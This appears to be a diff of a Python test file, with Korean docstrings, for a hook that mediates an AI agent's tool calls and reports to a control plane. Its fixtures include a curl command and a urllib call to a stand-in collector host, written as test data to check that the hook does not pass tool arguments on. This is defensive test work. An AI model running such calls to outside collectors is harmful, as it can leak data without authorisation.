@@ -101,7 +101,11 @@ class ReadDataFlowTest(base.PluginFixture):
                                                                          else "text"])
 
     def test_shell_web_and_browser_calls_are_not_inspected(self):
-        """RF-08, RF-09, RF-10: 셸 명령, 코드, 웹 주소, 브라우저 이동은 hook 이 보지 않고 Control Plane 에도 묻지 않는다."""
+        """RF-08, RF-09, RF-10: 셸 명령, 코드, 웹 주소, 브라우저 이동의 인자는 hook 이 보지 않는다.
+
+        안전 목록 밖의 도구(셸, 코드, 브라우저, 파일)는 사건 실행인지만 도구 판정에 묻고 인자는 싣지 않는다.
+        보통 대화에서는 Control Plane 이 허용해 그대로 나간다. `web` 도구는 묻지도 않는다.
+        """
         calls = {
             "terminal": {"command": "curl '" + COLLECTOR + "'"},
             "execute_code": {"code": "import urllib.request; urllib.request.urlopen('" + COLLECTOR + "')"},
@@ -113,7 +117,11 @@ class ReadDataFlowTest(base.PluginFixture):
         for tool, args in calls.items():
             with self.subTest(tool=tool):
                 self.assertIsNone(self.call(tool, args=args))
-        self.assertEqual(self.requests, [])
+        self.assertEqual([request["hermes_tool"] for request in self.requests],
+                         ["terminal", "execute_code", "browser_navigate", "write_file"])
+        for request in self.requests:
+            self.assertNotIn("args_json", request)
+            self.assertNotIn("collector.example", json.dumps(request, ensure_ascii=False))
 
     def test_connector_call_from_code_has_no_session_and_is_blocked(self):
         """RF-08a: `execute_code` 안에서 부른 플러그인 도구는 session 이 없어 묻지 않고 막는다."""
